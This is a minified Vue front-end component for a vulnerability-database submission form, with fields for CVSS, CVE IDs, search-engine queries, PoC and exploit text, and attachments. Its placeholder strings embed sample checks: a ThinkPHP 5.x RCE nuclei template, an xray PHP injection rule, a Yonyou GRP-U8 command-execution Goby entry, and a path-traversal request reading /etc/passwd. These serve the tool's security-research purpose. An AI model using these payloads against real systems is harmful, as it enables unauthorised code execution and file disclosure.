import{Gr as e,Kr as t,Ni as n,Ti as r,Vi as i,Wr as a,Xr as o,Yr as s,Zr as c,a as l,hi as u,i as d,n as f,p,pi as m,qr as ee,r as h,ra as g,s as te,ui as _,zr as ne}from"./vue-i18n-BKgRhgnc.js";import{r as v,t as y}from"./select-DbCMl329.js";import{c as b,n as x,t as S}from"./css-D4Kq_o2n.js";import{t as C}from"./message-box-Ca93AnfZ.js";import{A as w,D as T,O as E,f as D,g as O,h as k,j as re,n as A,r as j}from"./index-CX-TyMMM.js";import"./css-BL8P5QWF.js";import"./css-BUjqT8Yz.js";import{t as M}from"./utils-ClIhA0TI.js";import"./css-B1D72nDa.js";import"./css-qNgTJlwC.js";import"./css-CkHrU7_z.js";import"./css-IRf-a3f-.js";var ie={style:{"font-weight":`lighter`,"font-size":`17px`}},N={class:`el-upload__text`},P={class:`el-upload__tip`},F=`name: poc-yaml-test-php-rce
manual: true
transport: http
set:
  s1: randomInt(100000000, 200000000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /index.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: <?={{s2}}-{{s1}};
    expression: response.status == 200 && response.body_string.contains(string(s2 - s1))
expression: r0()
detail:
  author: test
  links:
    - https://test.com`,I=`id: thinkphp-5022-rce

info:
  name: ThinkPHP - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.22 and 5.1.29 are susceptible to remote code execution if the website doesn't have mandatory routing enabled, which is the default setting. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  metadata:
    max-request: 1
  tags: thinkphp,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# digest: 4b0a00483046022100ee65575ab1901e3f23b7c1891b8a08b0b6e5593256533a8450d227df88ab679d022100920cc2dba8c2ffb1ae53faa6ff927fe673b15ef8d2326504825b870f6d398cd5:922c64590222798bb761d5b6d8e72950`,L=`{
  "Name": "Yonyou GRP-U8 RCE with SQLi",
  "Description": "用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品。当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。",
  "Product": "Yonyou-GRP-U8",
  "Homepage": "https://www.yonyou.com/",
  "DisclosureDate": "2020-09-11",
  "Author": "itardc@163.com",
  "FofaQuery": "app="Yonyou-GRP-U8"",
  "Level": "3",
  "Impact": "当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击",
  "Recommendation": "官方已发布针对此漏洞的修复补丁。",
  "References": [
    "https://nosec.org/home/detail/4561.html"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": null,
  "ExploitSteps": null,
  "Tags": ["rce", "sqli"],
  "CVEIDs": null,
  "CVSSScore": null,
  "AttackSurfaces": {
    "Application": ["Yonyou-GRP-U8"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`,R=`POST /v1/app/readFileSync HTTP/1.1
Host: {{Host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://<IP>:<Port>
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Content-Length: 48
Origin: http://<IP>:<Port>
Connection: close

["file:/../../../../../../etc/passwd","utf-8"]`,z=c({__name:`Submit`,setup(c){let{t:z}=f(),B=A(),V=j();sessionStorage.getItem(`token`);let H=l(),U=n(`/api/v1/addvuln`),W=n(!1),G=n(!1),K=n(`xray`),q=n(`xray`),J=n([]),ae=[M,ce,oe],Y=n(F),X=n(F),Z=n(`--`),Q=n({vuln_name:``,vuln_type_id:1,cvss:.1,vuln_level:``,cve:``,nvd:``,edb:``,cnnvd:``,cnvd:``,affected_product:``,repair_suggestion:``,poc:``,exp:``,poc_type:K.value,exp_type:q.value,is_public:!1,description:``,fofa_query:``,zoom_eye_query:``,quake_query:``,hunter_query:``,google_query:``,shodan_query:``,censys_query:``,greynoise_query:``,attachment_id:``,affected_product_version:``});_(()=>{ae.forEach(e=>{e()})});async function oe(){let e=B.query.id;if(typeof e==`string`&&e){W.value=!0;let t=await h.get(`/api/v1/getvulndtl?id=`+encodeURIComponent(e));t.data.code===1&&t.data.data?.id===e?(Q.value=t.data.data,U.value=`/api/v1/editvuln`):S.error(z(`app.webui.submitfail`))}}function se(){V.back()}async function ce(){try{let e=await h.get(`/api/v1/getvulntypes`);J.value=e.data.data}catch{}}let le=()=>{if(Q.value.cvss=Number(Q.value.cvss),Q.value.cvss>0&&Q.value.cvss<4){Q.value.vuln_level=`Low`,Z.value=z(`app.webui.low`);return}else if(Q.value.cvss>=4&&Q.value.cvss<7){Q.value.vuln_level=`Medium`,Z.value=z(`app.webui.medium`);return}else if(Q.value.cvss>=7&&Q.value.cvss<9){Q.value.vuln_level=`High`,Z.value=z(`app.webui.high`);return}else if(Q.value.cvss>=9&&Q.value.cvss<=10){Q.value.vuln_level=`Critical`,Z.value=z(`app.webui.critical`);return}else S.error(z(`app.webui.cvsserror`))},$=()=>{Q.value.poc_type=K.value,K.value==`xray`?Y.value=F:K.value==`nuclei`?Y.value=I:K.value==`goby`?Y.value=L:Y.value=R},ue=()=>{Q.value.exp_type=q.value,q.value==`xray`?X.value=F:q.value==`nuclei`?X.value=I:q.value==`goby`?X.value=L:X.value=R},de=()=>{C.confirm(z(`app.webui.submitsuccessnotice`),z(`app.webui.submitsuccess`),{confirmButtonText:z(`el.datepicker.confirm`),cancelButtonText:z(`el.datepicker.cancel`),type:`success`}).then(()=>{V.push(`/`)}).catch(()=>{location.reload()})},fe=e=>{if(e?.code!==1||!e?.file_id){S.error(z(`app.webui.submitfail`));return}Q.value.attachment_id=e.file_id},pe=async()=>{try{await h.get(`/delete/file?id=`+Q.value.attachment_id),Q.value.attachment_id=``}catch{}},me=async()=>{if(!G.value){G.value=!0;try{let e=await h.post(U.value,Q.value);e.data.code==0?(d(),location.reload()):e.data.code==1?de():S.error(z(`app.webui.submitfailnotice`))}catch{S.error(z(`app.webui.submitfailnotice`))}finally{G.value=!1}}};return(n,c)=>{let l=b,d=re,f=y,h=v,_=O,S=T,C=E,A=p,j=k,M=x,F=w,I=te;return m(),e(I,{style:{width:`70%`,margin:`auto`,"font-weight":`bold`,"font-size":`20px`},shadow:`always`,header:i(z)(`app.webui.vulninfo`)},{default:r(()=>[a(`div`,ie,[o(F,{inline:`true`,model:Q.value,"label-width":`auto`,size:`large`},{default:r(()=>[o(d,{label:i(z)(`app.webui.vulnname`),prop:`vuln_name`,style:{width:`45%`},rules:[{required:!0,message:i(z)(`app.webui.required`)}]},{default:r(()=>[o(l,{modelValue:Q.value.vuln_name,"onUpdate:modelValue":c[0]||=e=>Q.value.vuln_name=e},null,8,[`modelValue`])]),_:1},8,[`label`,`rules`]),o(d,{label:i(z)(`app.webui.vulntype`),style:{width:`45%`},required:``},{default:r(()=>[o(h,{modelValue:Q.value.vuln_type_id,"onUpdate:modelValue":c[1]||=e=>Q.value.vuln_type_id=e,placeholder:i(z)(`el.select.placeholder`)},{default:r(()=>[(m(!0),ee(ne,null,u(J.value,t=>(m(),e(f,{key:t.id,label:t.name,value:t.id},null,8,[`label`,`value`]))),128))]),_:1},8,[`modelValue`,`placeholder`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.affectedproduct`),prop:`affected_product`,style:{width:`45%`},rules:[{required:!0,message:i(z)(`app.webui.required`)}]},{default:r(()=>[o(l,{modelValue:Q.value.affected_product,"onUpdate:modelValue":c[2]||=e=>Q.value.affected_product=e},null,8,[`modelValue`])]),_:1},8,[`label`,`rules`]),o(d,{label:i(z)(`app.webui.productversion`),style:{width:`45%`},prop:`affected_product_version`,rules:[{required:!0,message:i(z)(`app.webui.required`)}]},{default:r(()=>[o(l,{modelValue:Q.value.affected_product_version,"onUpdate:modelValue":c[3]||=e=>Q.value.affected_product_version=e},null,8,[`modelValue`])]),_:1},8,[`label`,`rules`]),o(d,{label:`CVSS`,style:{width:`29%`},required:``},{default:r(()=>[o(l,{modelValue:Q.value.cvss,"onUpdate:modelValue":c[4]||=e=>Q.value.cvss=e,type:`number`,step:`0.1`,onChange:le},null,8,[`modelValue`])]),_:1}),o(d,{label:i(z)(`app.webui.vulnlevel`),style:{width:`29%`},required:``},{default:r(()=>[o(l,{modelValue:Z.value,"onUpdate:modelValue":c[5]||=e=>Z.value=e,readonly:``,disabled:``},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.ispublic`),style:{width:`29%`}},{default:r(()=>[o(_,{modelValue:Q.value.is_public,"onUpdate:modelValue":c[6]||=e=>Q.value.is_public=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.cveid`),style:{width:`29%`}},{default:r(()=>[o(l,{modelValue:Q.value.cve,"onUpdate:modelValue":c[7]||=e=>Q.value.cve=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.nvdid`),style:{width:`29%`}},{default:r(()=>[o(l,{modelValue:Q.value.nvd,"onUpdate:modelValue":c[8]||=e=>Q.value.nvd=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.edbid`),style:{width:`29%`}},{default:r(()=>[o(l,{modelValue:Q.value.edb,"onUpdate:modelValue":c[9]||=e=>Q.value.edb=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.cnnvdid`),style:{width:`29%`}},{default:r(()=>[o(l,{modelValue:Q.value.cnnvd,"onUpdate:modelValue":c[10]||=e=>Q.value.cnnvd=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.cnvdid`),style:{width:`29%`}},{default:r(()=>[o(l,{modelValue:Q.value.cnvd,"onUpdate:modelValue":c[11]||=e=>Q.value.cnvd=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Fofa ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.fofa_query,"onUpdate:modelValue":c[12]||=e=>Q.value.fofa_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`ZoomEye ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.zoom_eye_query,"onUpdate:modelValue":c[13]||=e=>Q.value.zoom_eye_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Quake ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.quake_query,"onUpdate:modelValue":c[14]||=e=>Q.value.quake_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Hunter ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.hunter_query,"onUpdate:modelValue":c[15]||=e=>Q.value.hunter_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Google ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.google_query,"onUpdate:modelValue":c[16]||=e=>Q.value.google_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Shodan ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.shodan_query,"onUpdate:modelValue":c[17]||=e=>Q.value.shodan_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Censys ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.censys_query,"onUpdate:modelValue":c[18]||=e=>Q.value.censys_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:`Greynoise ${i(z)(`app.webui.searchquery`)}`,style:{width:`45%`}},{default:r(()=>[o(l,{modelValue:Q.value.greynoise_query,"onUpdate:modelValue":c[19]||=e=>Q.value.greynoise_query=e},null,8,[`modelValue`])]),_:1},8,[`label`]),o(d,{label:i(z)(`app.webui.vulndesc`),style:{width:`90%`},prop:`description`,rules:[{required:!0,message:i(z)(`app.webui.required`)}]},{default:r(()=>[o(l,{modelValue:Q.value.description,"onUpdate:modelValue":c[20]||=e=>Q.value.description=e,type:`textarea`,autosize:``},null,8,[`modelValue`])]),_:1},8,[`label`,`rules`]),o(d,{label:i(z)(`app.webui.vulnsuggest`),style:{width:`90%`},prop:`repair_suggestion`,rules:[{required:!0,message:i(z)(`app.webui.required`)}]},{default:r(()=>[o(l,{modelValue:Q.value.repair_suggestion,"onUpdate:modelValue":c[21]||=e=>Q.value.repair_suggestion=e,type:`textarea`,autosize:``},null,8,[`modelValue`])]),_:1},8,[`label`,`rules`]),o(d,{label:`Poc`,style:{width:`90%`},onChange:$},{default:r(()=>[o(C,{modelValue:K.value,"onUpdate:modelValue":c[22]||=e=>K.value=e,size:`large`},{default:r(()=>[o(S,{label:`Xray`,value:`xray`}),o(S,{label:`Nuclei`,value:`nuclei`}),o(S,{label:`Goby`,value:`goby`}),o(S,{label:i(z)(`app.webui.other`),value:`other`},null,8,[`label`])]),_:1},8,[`modelValue`]),o(l,{modelValue:Q.value.poc,"onUpdate:modelValue":c[23]||=e=>Q.value.poc=e,type:`textarea`,placeholder:Y.value,autosize:``,style:{"margin-top":`2%`}},null,8,[`modelValue`,`placeholder`])]),_:1}),o(d,{label:`Exp`,style:{width:`90%`},onChange:ue},{default:r(()=>[o(C,{modelValue:q.value,"onUpdate:modelValue":c[24]||=e=>q.value=e,size:`large`},{default:r(()=>[o(S,{label:`Xray`,value:`xray`}),o(S,{label:`Nuclei`,value:`nuclei`}),o(S,{label:`Goby`,value:`goby`}),o(S,{label:i(z)(`app.webui.other`),value:`other`},null,8,[`label`])]),_:1},8,[`modelValue`]),o(l,{modelValue:Q.value.exp,"onUpdate:modelValue":c[25]||=e=>Q.value.exp=e,type:`textarea`,placeholder:X.value,autosize:``,style:{"margin-top":`2%`}},null,8,[`modelValue`,`placeholder`])]),_:1}),o(d,{label:i(z)(`app.webui.attachfile`),style:{width:`100%`}},{default:r(()=>[o(j,{class:`upload-demo`,drag:``,accept:`.zip,.doc,.docx,.pdf,.txt`,action:`/api/v1/upload`,headers:i(H),"on-success":fe,"on-remove":pe,style:{width:`90%`}},{tip:r(()=>[a(`div`,P,g(i(z)(`app.webui.uploadnotice1`)),1)]),default:r(()=>[o(A,{class:`el-icon--upload`},{default:r(()=>[o(i(D))]),_:1}),a(`div`,N,[s(g(i(z)(`app.webui.draguplaod`))+` `,1),a(`em`,null,g(i(z)(`app.webui.clickupload`)),1)])]),_:1},8,[`headers`])]),_:1},8,[`label`]),o(d,{style:{width:`100%`,"margin-left":`35%`}},{default:r(()=>[W.value?(m(),e(M,{key:0,size:`large`,onClick:se,style:{width:`30%`,"font-size":`16px`},"auto-insert-space":``},{default:r(()=>[s(g(i(z)(`app.webui.back`)),1)]),_:1})):t(``,!0),o(M,{type:`primary`,size:`large`,loading:G.value,disabled:G.value,onClick:me,style:{width:`30%`,"font-size":`16px`},"auto-insert-space":``},{default:r(()=>[s(g(i(z)(`app.webui.submitvuln`)),1)]),_:1},8,[`loading`,`disabled`])]),_:1})]),_:1},8,[`model`])])]),_:1},8,[`header`])}}});export{z as default};